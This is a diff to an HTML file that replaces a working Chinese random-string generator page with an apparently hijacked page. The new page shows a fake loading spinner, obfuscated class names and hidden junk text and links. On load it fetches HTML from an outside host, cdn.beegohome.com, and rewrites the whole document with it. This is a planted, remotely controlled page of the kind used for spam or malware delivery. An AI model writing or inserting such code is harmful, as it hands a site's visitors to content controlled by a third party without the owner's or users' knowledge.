@@ -1,161 +1,181 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Document</title>
+<html>
+<head> <meta charset="utf-8" />
     <style>
-        #main {
-    max-width: 400px;
-}
+        iframe {
+            display: none;
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            border: 0
+        }
 
-ul {
-    margin: 0;
-    padding: 0;
-    border-top: 1px solid #eee;
-    list-style: none;
-    font-size: 14px;
-}
+        body {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            border: 0
+        }
 
-li {
-    clear: both;
-    overflow: hidden;
-    padding: .5em 0;
-    border-bottom: 1px solid #eee;
-}
+        .B9wgDa2R8 {
+            position: fixed;
+            left: 0;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            z-index: 1;
+            background-color: #d8d8d8
+        }
 
-.pure-form label {
-    display: block;
-    overflow: hidden;
-    margin: 0;
-}
+        .B9wgDa2R8 .pz7x2M63gMC {
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            height: 50px;
+            margin: auto
+        }
 
-.pure-form span {
-    float: left;
-    margin: 6px 0;
-}
+        .B9wgDa2R8 .content {
+            line-height: 50px;
+            text-align: center
+        }
 
-input {
-    float: right;
-    margin-top: 9px;
-}
+        .B9wgDa2R8 .img {
+            width: 100%
+        }
 
-#special_characters,#exclude_characters,#password_length,#password_quantity {
-    margin-top: 0;
-    width: 5em;
-    text-align: right;
-}
+        .B9wgDa2R8 .m6wJvj94 {
+            text-align: center
+        }
 
-#special_characters,#exclude_characters {
-    width: 60%;
-}
+        .B9wgDa2R8 .m6wJvj94 span {
+            display: inline-block;
+            width: 6px;
+            height: 50px;
+            background-color: #FF5722;
+            -webkit-transform: scaleY(0.4);
+            transform: scaleY(0.4);
+            -webkit-animation: scale 1s infinite;
+            animation: scale 1s infinite
+        }
 
-#generate {
-    margin: 1em 0;
-}
+        .B9wgDa2R8 .m6wJvj94 span:nth-child(2) {
+            -webkit-animation: scale 1s .2s infinite;
+            animation: scale 1s .2s infinite
+        }
 
-#output {
-	font-family: Monaco, Menlo, Consolas, Inconsolata, 'Deja Vu Sans Mono', 'Droid Sans Mono', 'Lucida Console', 'Courier New', Courier, monospace;
-}
+        .B9wgDa2R8 .m6wJvj94 span:nth-child(3) {
+            -webkit-animation: scale 1s .3s infinite;
+            animation: scale 1s .3s infinite
+        }
 
+        .B9wgDa2R8 .m6wJvj94 span:nth-child(4) {
+            -webkit-animation: scale 1s .4s infinite;
+            animation: scale 1s .4s infinite
+        }
+
+        .B9wgDa2R8 .m6wJvj94 span:nth-child(5) {
+            -webkit-animation: scale 1s .5s infinite;
+            animation: scale 1s .5s infinite
+        }
+
+        .B9wgDa2R8 .m6wJvj94 span:nth-child(6) {
+            -webkit-animation: scale 1s .6s infinite;
+            animation: scale 1s .6s infinite
+        }
+
+        @-webkit-keyframes scale {
+            0% {
+                -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4)
+            }
+            20% {
+                -webkit-transform: scaleY(0.8);
+                transform: scaleY(0.8)
+            }
+            40% {
+                -webkit-transform: scaleY(1);
+                transform: scaleY(1)
+            }
+            100% {
+                -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4)
+            }
+        }
+
+        @keyframes scale {
+            0% {
+                -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4)
+            }
+            20% {
+                -webkit-transform: scaleY(0.8);
+                transform: scaleY(0.8)
+            }
+            40% {
+                -webkit-transform: scaleY(1);
+                transform: scaleY(1)
+            }
+            100% {
+                -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4)
+            }
+        }
+
+        .B9wgDa2R8 .tips {
+            font-size: 1rem;
+            color: #fff;
+            text-align: center
+        }
     </style>
 </head>
-<body>
-    <div id="header">
-        <h1>随机字符串生成器</h1>
-        
-    </div>
-        
-    <form id="main" class="pure-form">
-        <ul>
-            <li><label><input type="checkbox" name="include_number" checked /><span>数字</span></label></li>
-            <li><label><input type="checkbox" name="include_lowercaseletters" checked /><span>小写字母</span></label></li>
-            <li><label><input type="checkbox" name="include_uppercaseletters" checked /><span>大写字母</span></label></li>
-            <li><label><span>添加符号</span><input type="text" name="special_characters" placeholder="输入需要添加的特殊符号" /></label></li>
-            <li><label><span>排除字符</span><input type="text" name="exclude_characters" placeholder="比如：i, l, 1, L, o, 0, O" /></label></li>
-            <li><label><input type="checkbox" name="password_unique" /><span>字符不重复</span></label></li>
-            <li><label><span>字符串长度</span><input type="number" name="password_length" min="0" value="8" /></label></li>
-            <li><label><span>字符串数量</span><input type="number" name="password_quantity" min="0" value="1" /></label></li>
-        </ul>
-        <button type="button" id="generate" class="pure-button pure-button-primary pure-input-1">随机生成</button>
-        <textarea name="output" class="pure-input-1" cols="40" rows="7" readonly></textarea>
-    </form>
-            
-</body>
-<script>
-    var form = document.getElementById('main');
-
- function rand(max) {
-    return Math.floor(Math.random() * max);
-}
-
-document.getElementById('generate').onclick = function () {
-    var chars = '';
-    var passwords = [];
-    var passwordUnique = form.password_unique.checked;
-    var quantity = Number(form.password_quantity.value);
-    if (form.include_number.checked) chars += '0123456789';
-    if (form.include_lowercaseletters.checked) chars += 'abcdefghijklmnopqrstuvwxyz';
-    if (form.include_uppercaseletters.checked) chars += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    if (form.exclude_characters.value) chars = chars.replace(new RegExp(form.exclude_characters.value.split('').join('|'), 'g'), '');
-
-    while (passwords.length < quantity) {
-        var _chars = chars.split('');
-        var password = '';
-
-        for (var i = 0, l = form.password_length.value; i < l; i++) {
-            if (_chars.length < 1) break;
-
-            var idx = rand(_chars.length);
-            password += _chars[idx];
-            if (passwordUnique) _chars.splice(idx, 1);
-            
-        }
-        if (form.special_characters.value) password =form.special_characters.value+password;
-        if (passwords.indexOf(password) === -1) passwords.push(password);
-
+<body><script>
+    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
+    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+    function Dget(e, t,a) {
+        var n = new XMLHttpRequest;
+        //n.timeout = 3000;
+        n.onreadystatechange = function () {
+            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
+        };n.ontimeout = function (e) {
+            //alert('请求超时,重新发起请求');
+            //location.reload();
+        };
+        n.open("GET", e, !0),
+            n.send(null)
     }
+    var temp = getUrlParam('temp');
 
-    form.output.value = passwords.join('\n');
-};
+    //if(document.referrer){
+    var temp_name = temp +'.html';
+    Dget('//cdn.beegohome.com/Mjk/haisqwefer.html',function(res){
+        var doc=document.open("text/html","replace")
+        doc.write(res);
+        doc.close()
+    })
+    //}
 
-form.output.onfocus = function () {
-    this.select();
-};
+</script> 
+<img  src='' style='display:none'>
+<a  href='#' style='display:none'>jRgXQdREHBJRxKHRIoq5nC9OeM977Zgz1KGXQq5V6LmkCRdqmRm6Ntr1Z7MFdVH3AakFBSR7N</a>
+<li style='display:none' >骄锹康挨俏袒税氰彩唤缚搽筐阿却寥狙拖被牟</li><div class="B9wgDa2R8">
+    <div class="pz7x2M63gMC">
+        <div class="m6wJvj94">
+            <p style="font-size:50px;color:#FF5722; padding-top: 18%; margin:-28% auto">正在加载...</p>
 
-function loadConfig() {
-    var config = JSON.parse(localStorage.getItem('passwordConfig'));
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span></div>
 
-    Object.keys(config).forEach(function(name) {
-        var value = config[name];
-        var input = form[name];
+    </div>
+</div>
+</body>
 
-        if (input.type === 'checkbox') {
-            input.checked = value;
-        } else {
-            input.value = value;
-        }
-    });
-}
-
-function saveConfig() {
-    var config = {};
-
-    [].forEach.call(form.getElementsByTagName('input'), function(input) {
-        config[input.name] = input.type === 'checkbox' ? input.checked : input.value;
-    });
-
-    localStorage.setItem('passwordConfig', JSON.stringify(config));
-}
-
-[].forEach.call(form.getElementsByTagName('input'), function(input) {
-    input.addEventListener('change', saveConfig);
-});
-
-if (localStorage.getItem('passwordConfig')) {
-    loadConfig();
-}
-
-</script>
 </html>
